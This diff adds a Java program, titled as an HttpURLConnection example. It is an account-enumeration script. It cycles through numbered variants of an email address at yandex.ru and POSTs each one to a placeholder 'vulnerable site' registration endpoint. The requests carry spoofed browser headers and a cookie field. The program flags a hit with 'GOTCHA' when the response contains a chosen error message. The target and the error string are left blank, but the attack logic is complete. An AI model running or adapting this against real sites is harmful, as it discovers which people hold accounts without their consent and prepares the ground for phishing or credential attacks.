@@ -1,0 +1,88 @@
+package httpurlconnectionexample;
+
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.concurrent.TimeUnit;
+
+import javax.net.ssl.HttpsURLConnection;
+
+public class HttpURLConnectionExample {
+
+    private final String USER_AGENT = "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36";
+
+    // query email parameter,  example: john.doe
+    // please note, domain name is omitted, can be added as part of URL parameeter below
+    private final static String BASE_EMAIL = "john.doe";
+    private final static int LIMITER_LOWER = 499;
+    private final static int LIMITER_UPPER = 501;
+    private final static String COOKIE = "";
+    public static void main(String[] args) throws Exception {
+
+        // simply, check for permutations of email address, denoted by i variable
+        for (int i = LIMITER_LOWER; i <= LIMITER_UPPER; ++i) {
+
+            HttpURLConnectionExample http = new HttpURLConnectionExample();
+            String check_this = BASE_EMAIL + i;
+            System.out.println("\nTesting : " + check_this + "\n");
+            http.sendPost("put the expression you're expecting as error message , here", check_this);
+            TimeUnit.MILLISECONDS.sleep(50);
+        }
+    }
+
+
+
+    private void sendPost(String substr, String email) throws Exception {
+
+        String url = "https://vulnerable site address";
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+
+        //request header
+        con.setRequestMethod("POST");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+        con.setRequestProperty("X-Requested-With", "XMLHttpRequest");
+        con.setRequestProperty("another header key", "true");
+        con.setRequestProperty(" +1 header key", "registration");
+        con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
+        con.setRequestProperty("Cookie", COOKIE);
+        
+        // assemble query parameters
+        String urlParameters = "email="+ email + "%40yandex.ru";
+
+        con.setDoOutput(true);
+        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
+        wr.writeBytes(urlParameters);
+        wr.flush();
+        wr.close();
+
+        int responseCode = con.getResponseCode();
+        //System.out.println("\nSending 'POST' request to URL : " + url);
+        // System.out.println("Post parameters : " + urlParameters);
+        // System.out.println("Response Code : " + responseCode);
+
+        BufferedReader in = new BufferedReader(
+                new InputStreamReader(con.getInputStream()));
+        String inputLine;
+        StringBuffer response = new StringBuffer();
+
+        while ((inputLine = in.readLine()) != null) {
+            response.append(inputLine);
+            response.append("\n");
+        }
+        in.close();
+
+        //print result
+        String r_str = response.toString();
+        if (email.contains(BASE_EMAIL + String.valueOf(LIMITER_UPPER ) )) {
+            System.out.println(r_str);
+        }
+        boolean buli = r_str.contains(substr);
+        if (buli) {
+            System.out.println("GOTCHA !!!: " + email);
+        }
+    }
+
+}
